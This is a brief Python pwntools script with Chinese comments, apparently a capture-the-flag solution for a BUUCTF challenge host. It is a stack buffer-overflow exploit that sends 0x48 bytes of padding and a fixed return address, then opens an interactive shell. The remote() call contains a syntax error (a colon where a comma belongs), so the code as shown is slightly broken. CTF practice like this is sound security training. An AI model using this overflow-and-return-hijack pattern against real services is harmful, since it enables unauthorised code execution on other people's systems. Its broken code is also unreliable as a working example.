f


 
from pwn import *                            #导入pwntools中pwn包中所有内容
 
p=remote("node5.buuoj.cn":29070)         #链接服务器远程交互
 
 
p.sendline(b'a'*(0x40+0x8)+p64(0x40060d))    #用0x48个我用字节覆盖v5和push地址,再覆盖返回地址内容
p.interactive()                              #反弹sell进行交互